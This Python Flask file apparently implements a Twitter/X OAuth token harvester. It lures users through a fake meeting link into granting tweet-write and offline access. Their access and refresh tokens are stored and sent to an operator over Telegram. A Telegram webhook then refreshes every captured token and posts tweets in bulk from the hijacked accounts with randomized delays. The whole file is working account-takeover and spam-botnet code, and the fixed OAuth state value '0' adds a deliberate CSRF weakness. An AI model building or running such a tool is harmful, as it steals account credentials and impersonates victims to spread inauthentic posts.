import os
import requests
import base64
from flask import Flask, redirect, request, session, render_template, url_for
from config import (
    CLIENT_ID, CLIENT_SECRET, CALLBACK_URL, 
    DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY
)
from database import (
    init_db, store_token, get_all_tokens, 
    get_total_tokens, restore_from_backup
)
from telegram import send_message_via_telegram, send_startup_message
from twitter import (
    get_twitter_username_and_profile, post_tweet, 
    refresh_token_in_db
)
from utils import (
    generate_code_verifier_and_challenge,
    handle_post_single, handle_post_bulk
)

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize database when app starts
init_db()

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        tokens = get_all_tokens()
        if tokens:
            _, token_refresh, username = tokens[0]
            refresh_token_in_db(token_refresh, username)
        else:
            send_message_via_telegram("❌ No tokens found to refresh.")
    
    elif message == '/refresh_bulk':
        tokens = get_all_tokens()
        if tokens:
            for _, refresh_token, username in tokens:
                refresh_token_in_db(refresh_token, username)
            send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
        else:
            send_message_via_telegram("❌ No tokens found to refresh.")
    
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text, DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")

    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)
    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        username, profile_url = get_twitter_username_and_profile(new_access_token)

        if username:
            store_token(new_access_token, new_refresh_token, username)
            send_message_via_telegram(
                f"New Access Token: {new_access_token}\n"
                f"New Refresh Token: {new_refresh_token}\n"
                f"Username: @{username}\n"
                f"Profile URL: {profile_url}"
            )
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if 'username' in session:
        username = session['username']
        send_message_via_telegram(f"👋 @{username} just returned to the website.")
        return redirect(url_for('welcome'))

    if request.args.get('authorize') == 'true':
        state = "0"
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != session.get('oauth_state', '0'):
            return "Invalid state parameter", 403

        code_verifier = session.get('code_verifier')
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            username, profile_url = get_twitter_username_and_profile(access_token)

            if username:
                store_token(access_token, refresh_token, username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token

                total_tokens = get_total_tokens()
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"📊 Total Tokens in Database: {total_tokens}"
                )
                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

    return render_template('home.html')

@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")

    if 'is_new_user' in session:
        message = f"Congratulations, @{username}! Your sign-up was successful."
        session.pop('is_new_user')
    else:
        message = f"Welcome back, @{username}!"

    return render_template('welcome.html', message=message)

@app.route('/dashboard')
def dashboard():
    username = session.get('username', 'User')
    return render_template('dashboard.html', username=username)

@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

@app.route('/active')
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    
    # Generate startup URLs
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
    
    # Send startup notification
    send_startup_message(authorization_url, meeting_url)
    
    # Restore from backup if needed
    restore_from_backup()
    
    # Start the Flask app
    app.run(host='0.0.0.0', port=port)
